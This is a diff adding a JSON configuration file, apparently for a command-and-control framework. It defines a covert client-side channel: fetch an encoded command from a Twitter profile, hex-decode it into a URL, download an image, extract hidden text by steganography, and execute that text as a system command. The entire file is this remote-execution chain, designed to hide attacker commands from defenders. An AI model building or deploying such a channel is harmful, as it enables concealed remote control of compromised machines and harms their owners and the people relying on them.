@@ -1,0 +1,49 @@
+[
+    {
+        "type": "Transportation", 
+        "module": "Twitter", 
+        "chain": "CLIENT", 
+        "settings": {
+            "function": "f_grab_cmd_from_twitter_profile", 
+            "args": {
+                "profile_name": "something_bull"
+            }
+        }
+    }, 
+    {
+        "type": "Transformation", 
+        "module": "Crypto", 
+        "chain": "CLIENT", 
+        "settings": {
+            "function": "f_hex_to_ascii", 
+            "args": null
+        }
+    }, 
+    {
+        "type": "Transportation", 
+        "module": "Web", 
+        "chain": "CLIENT", 
+        "settings": {
+            "function": "f_retrieve_image_from_input_url", 
+            "args": null
+        }
+    }, 
+    {
+        "type": "Transformation", 
+        "module": "Stego", 
+        "chain": "CLIENT", 
+        "settings": {
+            "function": "f_extract_text_from_image", 
+            "args": null
+        }
+    }, 
+    {
+        "type": "Post", 
+        "module": "Command", 
+        "chain": "CLIENT", 
+        "settings": {
+            "function": "f_exec_system", 
+            "args": null
+        }
+    }
+]
